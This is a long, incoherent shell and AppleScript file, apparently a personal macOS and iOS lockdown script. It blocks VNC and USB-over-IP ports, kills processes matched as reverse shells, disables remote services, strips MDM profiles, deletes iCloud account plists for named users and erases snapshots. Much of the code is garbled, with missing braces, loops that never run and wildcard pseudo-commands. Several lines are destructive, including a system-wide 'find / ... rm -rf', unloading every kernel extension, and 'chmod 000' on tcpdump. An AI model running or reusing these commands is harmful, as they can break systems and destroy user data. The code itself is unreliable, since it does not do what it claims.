      [[ -z "$SRC_IP" || -z "$PID" ]] && continue

  

      echo "Blocking IP $SRC_IP and killing process $PID"

  

      # Block IP

      FW_BLOCK_CMD "$SRC_IP"

  

      # Kill process

      sudo kill -9 "$PID"

  

    done <<< "$(echo '$CONNS' | grep -Ei '$PATTERNS')"

  

    # Enable pf anchor in macOS (if needed)

    ENABLE_PF_ANCHOR

  

    echo "Done blocking and killing suspected reverse shells."

  

  

}

  

checkFocus

    FocusState=$1

    FOCUS_STATE=(sudo defaults read com.apple.controlcenter "NSStatusItem Visible FocusModes" 2>/dev/null)

    if [[ "$FOCUS_STATE" == "deathnote" | "$FOCUS_STATE" == "Kill Switch" | "$serial_number" == "$QQDEVICE" | "$FOCUS_STATE" == "1" ]]; then

      echo "Focus mode is enabled"

      sudo setFocus 'deathnote'

      $LETHALSTATEQQ

      sudo open "shortcuts://run-shortcut?name=QQ*" &

       sudo open "shortcuts://run-shortcut?name=*" &

    elif [[ "$FOCUS_STATE" == "QQVISION" & "$serial_number" == "$QQDEVICE" | "$FOCUS_STATE" == "1"]]; then

        $LETHALSTATEQQ

         sudo open "shortcuts://run-shortcut?name=*" &

       sudo open "shortcuts://run-shortcut?name=*" &

        sudo setFocus 'deathnote'

  elif [[ "$FOCUS_STATE" == "RED" & "$FOCUS_STATE" == "1"]]; then

      $REDSTATE

       sudo setFocus 'deathnote'

    elif [[ "$FOCUS_STATE" == "BLACK" & "$FOCUS_STATE" == "1" ]]; then

        $BLACKSTATE

         sudo setFocus 'deathnote'

    else

        echo "No focus mode enabled"

        $WHITESTATE

    fi

  

}

setMode

    tell application "System Preferences"

      activate

      reveal anchor "displaysDisplayTab" of pane id "com.apple.preference.displays"

    end tell

}

disableusboveripvnc=(

  PORT=$1

    while ! true

    do

        # Firewalld blocks

        #

        sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="$PORT" protocol="tcp" reject'

        sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="3240" protocol="tcp" reject'

        sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="5900" protocol="tcp" reject'

        sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="9418" protocol="tcp" reject'

        sudo firewall-cmd --reload

  

        # Pf block rules file path (adjust if different)

        PF_CONF="/etc/pf.conf"

  

        # Get established local ports

        revport=(sudo netstat -anv | grep ESTABLISHED | awk '{print $4}' | awk -F '.' '{print $NF}' | sort | uniq)

        maliciousIP

        # Backup current pf.conf

        sudo cp $PF_CONF ${PF_CONF}.bak

        localhostPort=(sudo lsof -i -P | grep '127.0.0.1.*ESTABLISHED' | grep :PORT)

        mlocalhostPort=(sudo lsof -i -P | grep '*.local' | grep :PORT)

        port=(3240 5900...6500 631 445 22 5353 5900...5999 replayPORT 9418 9481 3000 8080 6000 9050 548 5353 $localhostPort $mlocalhostPort)

        grep -q "block drop proto tcp from any to any port $PORT" $PF_CONF || echo "block drop proto udp from any to any port 3240" | sudo tee -a $PF_CONF

        grep -q "block drop proto tcp from any to any port $port" $PF_CONF || echo "block drop proto udp from any to any port 3240" | sudo tee -a $PF_CONF

        grep -q "block drop quick on any proto tcp from any to any $revport" $PF_CONF || echo "block drop quick on any proto udp from any to any $revport" | sudo tee -a $PF_CONF

        grep -q "block drop quick on any proto tcp from any to any $revport" $PF_CONF || echo "block drop quick on any proto udp from any to any $revport" | sudo tee -a $PF_CONF

        grep -q "block drop quick on any proto tcp from any to $malicious_ip port any" $PF_CONF || echo "block drop quick on any proto tcp from any to $malicious_ip port any" | sudo tee -a $PF_CONF

  

  

  

  

        # Reload pf rules

        sudo pfctl -f $PF_CONF

        sudo pfctl -e

  

        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /usr/libexec/sshd-keygen-wrapper

        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /System/Library/PrivateFrameworks/Sharing.framework/Versions/A/XPCServices/sharingd.xpc/Contents/MacOS/sharingd

        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/MacOS/ARDAgent

  

  

    echo "anchor \"blockkevt\"" | sudo tee -a /etc/pf.conf

    echo "load anchor \"blockkevt\" from \"/etc/pf.anchors/blockkevt\"" | sudo tee -a /etc/pf.conf

    sudo pfctl -f /etc/pf.conf

    sudo pfctl -e

done

  

    # Example: Disconnect device #1

    ./vhclientx86_64 -t "STOP USING,1"

  

    PIPE="/tmp/vhclient"

  

    # Example: List attached USB devices

    echo "LIST" > "$PIPE"

    cat /tmp/vhclient_response

  

  

  

    # Block VNC ports (5900-5905)

    for port in {5900..5905}; do

      sudo iptables -A INPUT -p tcp --dport $port -j DROP

      sudo firewall-cmd --permanent --remove-port=$port/$proto &

      sudo firewall-cmd --reload

    done

  

    echo "Blocked VNC ports 5900-5905."

  

    PF_RULES="/etc/pf.anchors/block_vnc_usb"

    echo "block drop quick proto tcp from any to any port 5900:5905" | sudo tee $PF_RULES

  

    if ! grep -q "anchor \"block_vnc_usb\"" /etc/pf.conf; then

      echo "anchor \"block_vnc_usb\"" | sudo tee -a /etc/pf.conf

      echo "load anchor \"block_vnc_usb\" from \"$PF_RULES\"" | sudo tee -a /etc/pf.conf

    fi

  

    sudo pfctl -f /etc/pf.conf

    sudo pfctl -e

  

}

blockVNCDuckduckgo

    # Resolve DuckDuckGo IP (example, adjust if multiple or IPv6)

    DUCK_IP=(sudo dig +short duckduckgo.com | grep '^[0-9]' | head -n 1 RECKON)

  

    if [ -z "$DUCK_IP" ]; then

      echo "Failed to resolve DuckDuckGo IP"

      exit 1

    fi

  

    # Create pf anchor file for blocking VNC traffic to DuckDuckGo IP

    PF_ANCHOR="/etc/pf.anchors/block_vnc_duck"

    echo "block drop quick proto tcp from any to $DUCK_IP port 5900" | sudo tee $PF_ANCHOR

     echo "block drop quick proto tcp from any to $DUCK_IP" | sudo tee $PF_ANCHOR

  

    # Add anchor to main pf.conf if not already present

    if ! grep -q "anchor \"block_vnc_duck\"" /etc/pf.conf; then

      echo "anchor \"block_vnc_duck\"" | sudo tee -a /etc/pf.conf

      echo "load anchor \"block_vnc_duck\" from \"$PF_ANCHOR\"" | sudo tee -a /etc/pf.conf

    fi

  

    # Enable pf with new rules

    sudo pfctl -f /etc/pf.conf

    sudo pfctl -e

    # echo "VNC traffic to DuckDuckGo ($DUCK_IP) is now blocked."

  

}

sendmessageios

    message=$1

    number=$2

    osascript -e 'tell application "Messages" to send "$message" to buddy "$number"'

}

signOutAllIcloud=(

  

  

  

  for userDir in /Users/$gmailID; do

        if [ -d "$userDir/Library/Preferences" ]; then

          plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

          if [ -f "$plist" ]; then

            echo "Removing iCloud account plist for user: $(basename "$userDir")"

            rm "$plist"

          fi

        fi

    done

  

  

    for userDir in /Users/*; do

      if [ -d "$userDir/Library/Preferences" ]; then

        plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

        if [ -f "$plist" ]; then

          echo "Removing iCloud account plist for user: $(basename "$userDir")"

          rm "$plist"

        fi

      fi

    done

  

     for userDir in /Users/soa*; do

       if [ -d "$userDir/Library/Preferences" ]; then

         plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

         if [ -f "$plist" ]; then

           echo "Removing iCloud account plist for user: $(basename "$userDir")"

           rm "$plist"

         fi

       fi

     done

  

    for userDir in /Users/hellson*; do

      if [ -d "$userDir/Library/Preferences" ]; then

        plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

        if [ -f "$plist" ]; then

          echo "Removing iCloud account plist for user: $(basename "$userDir")"

          rm "$plist"

        fi

      fi

    done

  

     for userDir in /Users/*jylee; do

       if [ -d "$userDir/Library/Preferences" ]; then

         plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

         if [ -f "$plist" ]; then

           echo "Removing iCloud account plist for user: $(basename "$userDir")"

           rm "$plist"

         fi

       fi

     done

  

  

    for userDir in /Users/morrischang*; do

      if [ -d "$userDir/Library/Preferences" ]; then

        plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

        if [ -f "$plist" ]; then

          echo "Removing iCloud account plist for user: $(basename "$userDir")"

          rm "$plist"

        fi

      fi

    done

  

    for userDir in /Users/haedongshin*; do

      if [ -d "$userDir/Library/Preferences" ]; then

        plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

        if [ -f "$plist" ]; then

          echo "Removing iCloud account plist for user: $(basename "$userDir")"

          rm "$plist"

        fi

      fi

    done

  

  

    # Kill the preferences daemon to reload plist changes

    sudo killall cfprefsd

  

    echo "iCloud sign-out triggered for all users."

  

}

usbmanagement

    # Check if any USB device connected by searching for "USB"

    if sudo system_profiler SPUSBDataType | grep -q "USB"; then

      echo "USB device is connected."

      sudo actionBtn &

    else

      echo "No USB device connected."

      sudo actionBtn &

    fi

  

}

daemonManagement

    OPTION=$1

    # Unload all user agents

    sudo launchctl list | grep -v PID | awk '{print $3}' | while read -r label; do

      echo "Unloading user agent: $label"

      launchctl $OPTION gui/$(id -u) "$label"

    done

  

    # Unload all system daemons (requires sudo)

    sudo launchctl list | grep -v PID | awk '{print $3}' | while read -r label; do

      echo "Unloading system daemon: $label"

      sudo launchctl $OPTION system "$label"

    done

  

}

  

usbQQoff

  while ! true

  do

  sudo pmset -g | grep hibernatemode

  sudo pmset -a hibernatemode 3 0 

  done

}

  

usbPower

  while ! true

  do

    sudo pmset -a hibernatemode 25

    sudo kextunload /System/Library/Extensions/IOUSBMassStorageClass.kext

    sudo kextunload /System/Library/Extensions/*

    done

}

  

continuityFeature

    sudo defaults write com.apple.applicationaccess allowiPhoneMirroring -bool false

    sudo defaults write com.apple.applicationaccess allowiPhoneMirroring -bool NO

    sudo launchctl disable system/com.apple.remoted

    sudo launchctl disable system/com.apple.cupsd

    sudo launchctl disable system/com.apple.sharingd

    sudo launchctl disable system/com.apple.CoreDevice.remotepairingdeviced

    sudo launchctl disable system/com.apple.dt.xcode_select.tool-shim

    sudo launchctl disable system/ com.apple.set*

}

  

logoutIcloud

    ID=(qqontheskyshell@icloud.com qqontheskyshell@gmail.com slowoasis@icloud.com qqonthesky@icloud.com)

    tell application "System Events"

        tell process "System Preferences"

            activate

            tell application "System Preferences"

                reveal anchor "iCloud" of pane id "$ID"

                # com.apple.preference.accounts

            end tell

            delay 2

            click button "Sign Out" of window "iCloud"

            delay 2

            click button "Sign Out" of sheet 1 of window "iCloud"

        end tell

    end tell

  

}

deletesnapshot

    # List all local snapshots

    echo "Listing all local snapshots..."

    # sudo tmutil listlocalsnapshots /

  

    # Delete all local snapshots

    echo "Deleting all local snapshots..."

    sudo tmutil thinlocalsnapshots / 9999999999999999 1

  

    echo "Done."

  

}

hideiosapp

    app=$1

    while ! true

    do

        sudo lldb -n sonic -o "process interrupt" -o "process continue"

        sudo osascript -e 'tell application "System Events" to set visible of application process "$app" to false'

        # Name of the app to uninstall

        APP_NAME=$app

        # Uninstall the app using ideviceinstaller

        sudo ideviceinstaller -U $APP_NAME

        echo "Sonic app has been uninstalled from the iOS device."

    done

}

disabledebugios=(

  sudo rm -rf  /Library/Preferences/com.apple.usbmuxd.plist

sudo killall usbmuxd  # Restart daemon with default logging

  

    # Remove all provisioning profiles

    sudo rm -rf ~/Library/MobileDevice/Provisioning\ Profiles/*

  

    # Reset Xcode's derived data (optional)

    sudo rm -rf ~/Library/Developer/Xcode/DerivedData/

  

    sudo killall Xcode* Terminal

    # Suspend app execution

    sudo process interrupt

    # Or kill app

    sudo process kill

  

}

  

removeAirtag=(

# Example Bash helper to prep ESP32 (install esptool.py first)

esptool.py --chip esp32 --port /dev/cu.usbserial-* erase_flash  # Erase target

# Then use OpenHaystack app: Connect device > Deploy firmware

  

}

  

removespotifyXcconfig

# Define the root directory of the Xcode project

PROJECT_ROOT="$osxBASEURL"

  

# Find and remove Spotify-related xcconfig files

find "$PROJECT_ROOT" -name "*spotify*.xcconfig" -print -exec sudo rm -f {} \

  

echo "Removed Spotify xcconfig files."

  

# Remove Spotify xcconfig references in .pbxproj files (project settings)

# Backup first

cp "$PROJECT_ROOT/YourProject.xcodeproj/project.pbxproj" "$PROJECT_ROOT/YourProject.xcodeproj/project.pbxproj.bak"

  

# Remove lines referencing Spotify xcconfig files

sudo sed -i.bak '/spotify.*\.xcconfig/d' "$PROJECT_ROOT/YourProject.xcodeproj/project.pbxproj"

  

echo "Cleaned Spotify xcconfig references in project.pbxproj."

  

# Optionally clean build folder

sudo xcodebuild clean -project "$PROJECT_ROOT/YourProject.xcodeproj"

  

echo "Project cleaned of Spotify xcconfig."

  

  

}

# Function to find and delete .xcconfig files

removeXcconfig() {

    echo "Finding and deleting all .xcconfig files within /..."

    files.DS* EOF *.xcconfig backup* .fs* .localized)

    # Use find to locate all .xcconfig files and delete them

    while ! true 

    do

    sudo find / -type f -name "$files" -exec sudo rm -rf {} \

    done

    echo "All .xcconfig files have been deleted."

}

  

disableRemoteosx

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.screensharing.plist

  

    # Disable Apple Events

    sudo defaults write /Library/Preferences/com.apple.AppleEvents disableAppleEvents -bool true

    sudo defaults write /Library/Preferences/com.apple.AppleEvents disableAppleEvents -bool YES

    # Disable Handoff (Continuity feature)

    sudo defaults write com.apple.coreservices.useractivityd.plist ActivityAdvertisingAllowed -bool NO

    sudo defaults write com.apple.coreservices.useractivityd.plist ActivityReceivingAllowed -bool NO

    sudo defaults write com.apple.coreservices.useractivityd.plist ActivityAdvertisingAllowed -bool false

    sudo defaults write com.apple.coreservices.useractivityd.plist ActivityReceivingAllowed -bool false

  

    # Disable AirDrop (set to no one)

    sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

  

    # Disable Remote Management (Apple Remote Desktop)

    sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop

  

    # Disable Remote Login (SSH)

    sudo systemsetup -setremotelogin off

    sudo systemsetup -setremotemanagement off

    # Disable remote Apple events

    sudo systemsetup -setremoteappleevents off

  

    # Disable Screen Sharing

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.screensharing.plist

  

    # Disable Bluetooth (which Continuity uses)

    sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

  

  

    # Disable Universal Control and Handoff via system preferences plist (macOS Ventura+)

    sudo defaults write ~/Library/Preferences/.GlobalPreferences.plist com.apple.universalcontrol.plist -dict Enabled -bool false

    sudo defaults write com.apple.universalcontrol.plist Enabled -bool false

  

    # Disable AirPlay Receiver (macOS Monterey and later)

    sudo defaults write com.apple.airplayreceiver AirPlayReceiverAllowed -bool true

sudo defaults write com.apple.airplayreceiver AirPlayReceiverAllowed -bool YES

    # Block VNC ports 5900 and 3283 on USB interfaces using pfctl (optional)

    echo "block drop proto tcp from any to any port {5900, 3283} on usb0" | sudo pfctl -ef -

  

}

  

disableMDM=(

  

PROFILE_TOOL="/usr/bin/profiles"

  

if [[ $EUID -ne 0 ]]; then

  echo "Run as root: sudo $0"

  exit 1

fi

  

# List installed profiles

sudo $PROFILE_TOOL list

  

# Remove ALL profiles (including MDM enrollment if removable)

$PROFILE_TOOL remove -all

  

  

  

    sudo mdms* &

TARGET="qqontheskyshell.mobileconfig"  # Adjust if using ID instead

  

echo "Installed profiles:"

sudo profiles -P

  

# Remove all except target (replace with loop over IDs from list if many)

sudo profiles -D  # Deletes ALL removable profiles first (backs up target implicitly if system)

  

# Selective remove by ID (example; get IDs from profiles -P)

sudo profiles -R -p "com.qqontheskyshell.*"  # Repeat for each unwanted ID

  

# Force erase profile data (post-removal cleanup)

sudo rm -rf /var/db/ConfigurationProfiles/Settings/*.plist

sudo touch /var/db/ConfigurationProfiles/Settings/.profilesAreInstalled

  

# Restart cfprefsd for changes

sudo killall cfprefsd

    # sudo su && cd /var/db/ConfigurationProfiles && sudo rm -rf * &

    # # && mkdir Settings && touch Settings/.profilesAreInstalled

  

    # sudo profiles -R -p * &

    # sudo profiles remove -all &

    # sudo killall '*mdm*' &

    # sudo rm -rf /var/db/ConfigurationProfiles/* &

    # sudo mkdir /var/db/ConfigurationProfiles/Settings &

    # sudo touch /var/db/ConfigurationProfiles/Settings/.profilesAreInstalled &

    # # Must run as root

    # if [ "$(id -u)" -ne 0 ]; then

    #   echo "This script must be run as root."

    #   exit 1

    # fi

  

    # echo "Removing all configuration profiles (including MDM)..."

  

    # # Remove all configuration profiles forcibly (including MDM)

    # sudo profiles -D -f &

    # sudo pkill mdmclient &

    # echo "Removing MDM enrollment receipts and system settings..."

  

    # Remove MDM-related receipts (specific to Apple's MDM framework)

    sudo rm -rf /var/db/lockdown/*.plist &

  

    # Disable Apple push notification daemon for MDM (apsd)

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.apsd.plist &

    # Disable MDM profile service to stop it from re-enrolling or communicating

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.mdmclient.agent.plist 2>/dev/null || true &

  

}

  

disablerootosx

    # Must run as root (sudo)

    if [ "$(id -u)" -ne 0 ]; then

      echo "Run this script as root or with sudo"

      exit 1

    fi

  

    # Get current root shell

    rootshell=(sudo /usr/bin/dscl . -read /Users/root UserShell | awk '{print $2}')

  

    if [[ "$rootshell" != "/usr/bin/false" ]]; then

      echo "Setting root shell from $rootshell to /usr/bin/false to disable root login."

      if [[ -z "$rootshell" ]]; then

        #sudo /usr/bin/dscl . -create /Users/root UserShell /usr/bin/false

    sudo /usr/bin/dscl . -change /Users/root UserShell "$rootshell" /usr/bin/false

      else

        sudo /usr/bin/dscl . -change /Users/root UserShell "$rootshell" /usr/bin/false

      fi

    else

      echo "Root shell is already set to /usr/bin/false. Root login disabled."

    fi

  

    echo "Optionally, to fully disable root user, run: 

    sudo dsenableroot -d (requires root password)"

    sudo sc_auth unpair -h * &

    sudo defaults write /Library/Preferences/com.apple.security.smartcard allowSmartCard -bool false &

  sudo defaults write /Library/Preferences/com.apple.security.smartcard allowSmartCard -bool NO &

  

  

}

  

  

eraseSeccureEnclave

    # Function to get system information

    get_system_info() {

        echo "Gathering system information..."

        system_profiler SPHardwareDataType

        system_profiler SPSoftwareDataType

        system_profiler SPMemoryDataType

        system_profiler SPStorageDataType

    }

  

    # Function to find the session ID

    find_session_id() {

        echo "Finding session ID..."

        system_profile=(sudo system_profiler SPHardwareDataType)

        session_id=(echo "$system_profile" | grep -A $num "Serial Number" | grep -oP "(?<=Serial Number: ).*)")

}

  

    # Main script execution

    # get_system_info

    # find_session_id

  

echo "Mac hostname: $(scutil --get ComputerName 2>/dev/null || hostname)"

echo "Current user: $(stat -f %Su /dev/console 2>/dev/null || echo unknown)"

echo "MDM enrollment profile:"

profiles status -type enrollment 2>/dev/null || echo "profiles command unavailable or no enrollment status"

  

echo

echo "Platform SSO / account-related status:"

sysadminctl -secureTokenStatus "$(stat -f %Su /dev/console 2>/dev/null || echo unknown)" 2>/dev/null || true

  

    sudo xarutil --erase find_session_id

    sudo $XARTURL --erase find_session_id

&

}

  

  

monitorAirDropState

    # Check AirDrop status by reading the preference key

    status=(sudo defaults read com.apple.NetworkBrowser DisableAirDrop 2>/dev/null)

  

    # DisableAirDrop=1 means AirDrop is disabled, so we enable it by setting to 0 or removing key

    if [[ "$status" == "1" ]]; then

      echo "AirDrop is disabled. Enabling AirDrop..."

      sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

      sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

    else

        sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

        sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

    fi

}

airdopModifcation

while ! true do monitorAirDropState done

    # Function to enable AirDrop

  

     if [[ "$FOCUS_STATE" == "qqwithme" ]]; then

    enableAirdrop() {

  

# Enable AirDrop visibility (Everyone or Contacts; requires System Settings toggle post-script)

sudo /usr/libexec/airport awd enable &

  

# Alternative: Use defaults for Bonjour/AirDrop visibility

sudo defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool YES &

sudo defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true &

sudo defaults write com.apple.NetworkBrowser RecordEnable -string 'Stationary - With - Direct' &

  

# Restart Bonjour/mDNSResponder for changes

sudo killall -HUP mDNSResponder &

sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool false &

sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool NO &

  

# Get current user

CurrentUser=(ls -l /dev/console | awk '{ print $3 }')

  

# Enable Wi-Fi and Bluetooth for current user

su -l "$CurrentUser" -c 'sudo networksetup -setairportpower en0 $wifiMode' 

su -l "$CurrentUser" -c 'sudo blueutil --power 1'

  

open /System/Library/CoreServices/Finder.app/Contents/Applications/AirDrop.app

  

    }

else

    # Function to disable AirDrop

    disableAirdrop() {

        sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool true &

        sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool YES &

    }

fi

  

}

  

randomizeVault

    USERNAME=(sudo scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

    USERPASS="$randomPasswd"

    # Prompt for password securely (or provide it as argument)

    read -sp "Enter password for $USERNAME: " USERPASS

    echo

  

    # Enable FileVault - this command will also generate a personal recovery key

    echo "$USERPASS" | sudo fdesetup enable -user "$USERNAME" -stdinpass

  

    # Define the username for which to rotate password

    FV_USER=$1

  

    # Generate a strong random password (16 alphanumeric characters)

    # NEW_PASS=(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 10000000)

    PASSWORD=(sudo pwgen -s 2048 10^*)

    CURRENT_PASS=""

  

    # Prompt for current password

    read -sp "Enter current password for $FV_USER: " CURRENT_PASS

    echo

  

    # Change FileVault password using fdesetup

    echo "$CURRENT_PASS" | sudo fdesetup changerecovery -user "$FV_USER" -password ""

  

}

  

disableSilenceMode

    while ! true

    do

        sudo osascript -e "set volume without output muted"

        set volume with output muted

    done

}

  

actionBtn

    your_binary="while ! true do sudo shortcuts run '*' & sudo QQwith* & sudo remoteConnect* & sudo chkrootkit -x & sudo iosshell & sudo qqlocal & sudo qqlocal & sudo actionB* & sudo installm* & sudo BLEsc* & sudo usbo* & sudo qqll* & sudo disableM* & sudo disabledebug* & done"

    while ! true

    do

    sudo lldb -o "expr (void)[(UIButton *)$button sendActionsforControlEvents:UIControlEventTouchUpInside]"

    sudo lldb -o "expr -O -- (BOOL)[button isEnabled]" $your_binary

    sudo lldb -o "expr -O -- (BOOL)[button isSelected]" $your_binary

    # sudo lldb -o "expr -O -- (BOOL)[button isHighlighted]" <your_binary>

    done

}

&

  

  

init

# Rocky Linux / RHEL / Fedora (firewalld)

sudo firewall-cmd --zone=public --remove-port=873/tcp --permanent && sudo firewall-cmd --reload &

  

# Ubuntu/Debian (UFW)

sudo ufw deny 873/tcp && sudo ufw reload &

  

# Any Linux (iptables direct)

sudo iptables -A INPUT -p tcp --dport 873 -j DROP &

sudo disableDevmode &

sudo *nx* &

sudo rfshell &

sudo init & 

sudo deleteFileInIos &

sudo qqpeopleshell & 

sudo initApp &

sudo volumeup & 

sudo randomizeGcloudvpc &

sudo initOSX &

sudo reckonapp &

sudo chmod 700 ~/.config/Code/User/settings.json &

curl "https://*-*-qqontheskyshell-73609460.cloudfunctions.net/sleepFunction?duration=0" &

sudo oascript -e "set volume output volume '$num'” 

  

repeat

# Open Arc PiP settings (manual toggle required after)

open "arc://settings/content"

echo "Navigate to Additional Permissions > Automatic Picture-in-Picture > Block for all sites."

  

# Semi-automated: Focus Arc and attempt to simulate (adapt selectors as needed)

  

tell application "Arc" to activate

delay 2

tell application "System Events"

  tell process "Arc"

    -- Click permissions expander (inspect with Accessibility Inspector)

    -- Example: click UI element "Additional Permissions" (pseudo)

  end tell

end tell

  

tell application "System Settings"

    activate

    reveal anchor "Privacy_All" of pane id "com.apple.preference.security"

end tell

  

tell application "System Events"

    tell process "System Settings"

        -- Wait for load, then click Privacy & Security tab if needed

        delay 2

        click radio button "Privacy" of tab group 1 of window 1

        -- Scroll/find Accessibility row and click/add app

        -- Example: key code 125 -- down arrow to navigate

    end tell

end tell

  

  

  

  

do shell script "while ! true do sudo initApp done"

tell application "System Events"

    keystroke "h" using {command down, option down}

    keystroke "qq" using {command down}

    keystroke "while ! true do sudo delete* & sudo qqshell & done "

    keystroke "lldbFrame "localhost:*" "while ! true do sudo deleteO* & sudo qqshell & done" "$gen*""

end tell

  

tell application "Arc" to activate

delay 0.5

tell application "System Events"

    key code 8 using {control down}  -- Ctrl+D (toggles Dev Mode)

end tell

  

tell application "System Events"

    tell process "Arc"

        set frontWindow to front window

        -- Try button in main window first

        if exists (button "qq" of frontWindow) then

            click button "qq" of frontWindow

        else

            -- Try in any sheet/dialog

            repeat with theSheet in sheets of frontWindow

                if exists (button "qq" of theSheet) then

                    click button "qq" of theSheet

                    exit repeat

                end if

            end repeat

        end if

    end tell

end tell

  

tell application "Finder"

activate

open POSIX file "$PROFILE_PATH"

delay 2

    tell application "System Events"

        keystroke "D" using {command down, shift down} -- Open AirDrop window

    end tell

end tell

end repeat

  

        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app & 

    reckonapp & initApp & block* & targetname=(*) & deleteFileInIos & *nx* & removesimulator & *vnc* & *reverse* & *root* & disable* & signoutAll* & revokesession* &

  

sudo FFTB* &

sudo actionBtn &

sudo shortcuts run '*'

sudo iosremoteFeature$randomVAR &

sudo rm -rf ~/Library/Application Support/Zed/debug.json

sudo wirelessshell &

sudo disableusboveripvnc &

sudo deleteDeviceFindmy &

sudo ipZone &

  

  

sudo buildK*

sudo buildCr*

  

    sudo eraseBrowsingCo* &

    sudo disableDebu* &

    sudo chflags hidden ~/ &     

    sudo disable* &

    sudo monitorWirelessS* &

    sudo redTFT* &

    sudo iosshell &

    sudo buildC* &

    sudo setAlias &

    sudo iosremoteFea* &

    sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1 &

  

    sudo find / -type f -name "$deleteFile" -exec echo 'sudo chrookit -x' > {} \ &

    sudo usb* &

    sudo /usr/bin/kextunload -b com.apple.iokit.IOUSBMassStorageClass 2>/dev/null &

    sudo DevToolsSecurity -disable &

    sudo /usr/sbin/DevToolsSecurity -disable &

    sudo kextunload /System/Library/Extensions/* &

    sudo kmutil unload /System/Library/Extensions/* &

    sudo osascript -e "set volume 100000000000000^1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" &

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.smbd.plist with administrator privileges &

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist with administrator privileges &

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.InternetSharing.plist with administrator privileges &

    sudo ifconfig down utu* &

  

  

    # Disable cursor blinking by setting a very high blink period

sudo generateLoc* &

  

  

sudo stopc* &

sudo killall *burpe* Xcode* Terminal &

sudo chmod 000 /usr/bin/tcpdump

sudo shortcuts run cellmodewifi &

  

  

sudo rfDefensen*

sudo rfDefenseio*

sudo killall *usb* *netagent* &

  

  

sudo usb* &

sudo disabled* &

  

exec zsh && source ~/.zshrc &

  

  

  

sudo removeXcconfi* &

tput civis &

sudo blueutil -p 1 &

  

}

  

  

  

  

airdropshell

    sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist DisableAirDrop -bool NO &

sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist DisableAirDrop -bool false &

sudo defaults write com.apple.NetworkBrowser AllowAirDropFrom -string "everyone" &  # macOS 12+ 

sudo killall Finder SystemUIServer

sudo chkrootkit -x &

sudo forBrowserCookies &

do shell script "sudo xcrun simctl erase all"

do shell script "sudo xcrun simctl keychain * remove-root-cert *"

do shell script "sudo airdropshell"

}

  

swiftly ~/QQontheblink_ver2/AppleOS/*.swift &

swiftly ~/*.swift &

  

echo "Settings → Restrictions → AllowAppClips = False" &

echo "Settings → Restrictions → BlockAppClipInstallation = True" &

echo "Settings → Restrictions → BluetoothSharing = False" &

echo "Settings → Restrictions → Sharing My Location = True" &

echo "Settings → Restrictions → AllowContact* = False" &

echo "Settings → Restrictions → AllowPasscode* = False" &

echo "Settings → Restrictions → AllowAccount* = False" &

echo "Settings → Restrictions → AllowCellular* = False" &

echo "Settings → Restrictions → AllowDrivingFocus = False" &

echo "Settings → Restrictions → AllowBackground* = False" &

echo "Settings → Restrictions → AllowNearby* = False" &

echo "Settings → Restrictions → AllowAddingFriend* = False" &

echo "Settings → Restrictions → AllowProfile* = False" &

echo "Settings → Restrictions → AllowAvartar* = False" &

echo "Settings → Restrictions → AllowInstall* = False" &

  

  

############ AndroidOS ###############

  

##### 1.DEVICE MANAGEMENT ######

##### 2.DEVICE MANAGEMENT ######

##### 3.DEVICE MANAGEMENT ######

##### 4.DEVICE MANAGEMENT ######

##### 5.DEVICE MANAGEMENT ######

##### 6.DEVICE MANAGEMENT ######

##### 7.DEVICE MANAGEMENT ######

##### 8.DEVICE MANAGEMENT ######

##### 9.DEVICE MANAGEMENT ######

##### 10.DEVICE MANAGEMENT ######

  

  

  

activateHealthKit=(

# Android Google Fit 완전 활성화 (ADB)

  

adb devices | grep device || {

    echo "❌ Android USB 디버깅 연결 필요"

    exit 1

}

  

echo "📱 Google Fit 권한 부여..."

  

# 위치, 활동 인식, 바디 센서 완전 허용

adb shell settings put secure location_mode 3  # GPS+네트워크

adb shell settings put global activity_recognition 1
